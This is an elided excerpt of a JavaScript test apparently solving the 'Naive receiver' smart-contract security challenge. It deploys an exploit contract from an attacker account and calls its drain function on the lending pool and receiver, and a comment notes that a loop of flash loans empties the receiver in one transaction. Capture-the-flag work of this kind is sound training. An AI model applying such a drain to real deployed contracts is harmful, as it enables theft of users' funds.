...
const Exploit = contract.fromArtifact('NaiveReceiverExploit')
...
describe('[Challenge] Naive receiver', function () {
  ...
  it('Exploit', async function () {
    ...
    // We actually just run a for loop doing the flash loan. doing this allows it to be done in 1 tx.
    this.exploit = await Exploit.new({ from: attacker })
    await this.exploit.drain(this.pool.address, this.receiver.address, { from: attacker })
  })
